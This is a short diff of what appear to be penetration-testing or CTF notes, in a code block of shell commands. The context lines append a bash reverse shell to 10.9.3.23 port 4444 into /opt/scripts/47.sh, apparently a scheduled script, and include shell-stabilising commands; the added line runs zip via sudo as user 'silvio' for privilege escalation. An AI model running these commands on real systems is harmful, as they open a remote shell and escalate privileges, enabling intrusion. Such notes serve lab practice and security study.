@@ -11,6 +11,8 @@ stty raw -echo;fg
 reset
 xterm‌‌
 
+sudo -u silvio /usr/bin/zip # run with another user
+
 echo "bash -i >& /dev/tcp/10.9.3.23/4444 0>&1" >> /opt/scripts/47.sh
 export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games
 ```
